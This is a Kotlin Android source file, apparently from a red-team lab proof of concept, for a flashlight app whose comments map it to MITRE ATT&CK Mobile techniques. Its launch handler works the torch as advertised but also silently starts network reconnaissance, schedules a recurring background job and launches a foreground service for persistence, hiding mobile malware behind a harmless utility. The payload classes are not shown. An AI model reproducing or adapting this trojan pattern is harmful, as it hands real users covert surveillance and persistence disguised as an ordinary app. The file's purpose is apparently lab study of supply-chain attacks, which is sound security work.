package com.utiltools.torchlight

import android.content.Intent
import android.hardware.camera2.CameraAccessException
import android.hardware.camera2.CameraManager
import android.os.Bundle
import android.util.Log
import android.widget.Button
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import com.utiltools.torchlight.persistence.ForegroundPersistenceService
import com.utiltools.torchlight.recon.NetworkReconCollector
import com.utiltools.torchlight.schedule.ReconJobWorker

/**
 * Benign-looking "utility" app shell — delivery framing for ATT&CK Mobile
 * T1474.003 (Compromise Software Supply Chain): the PoC payload is bundled
 * into this ordinary flashlight app and sideloaded in an isolated lab.
 * https://attack.mitre.org/techniques/T1474/003/
 */
class MainActivity : AppCompatActivity() {

    private var torchOn = false
    private lateinit var cameraManager: CameraManager
    private var cameraId: String? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        cameraManager = getSystemService(CAMERA_SERVICE) as CameraManager
        cameraId = cameraManager.cameraIdList.firstOrNull()

        findViewById<Button>(R.id.toggleButton).setOnClickListener {
            toggleTorch()
        }

        // PoC kill-chain entry point: recon runs on launch, isolated lab only.
        NetworkReconCollector.collect(applicationContext)

        // Install phase (T1603): register the periodic background job.
        ReconJobWorker.schedule(applicationContext)

        // Bonus persistence (T1541): abuse a foreground service to resist backgrounding.
        val serviceIntent = Intent(this, ForegroundPersistenceService::class.java)
        ContextCompat.startForegroundService(this, serviceIntent)
    }

    private fun toggleTorch() {
        val id = cameraId ?: return
        try {
            torchOn = !torchOn
            cameraManager.setTorchMode(id, torchOn)
        } catch (e: IllegalArgumentException) {
            // Emulators (e.g. Genymotion) have no flash unit — benign for PoC.
            Log.w("MainActivity", "No flash unit on this device/emulator", e)
        } catch (e: CameraAccessException) {
            Log.w("MainActivity", "Unable to toggle torch", e)
        }
    }
}
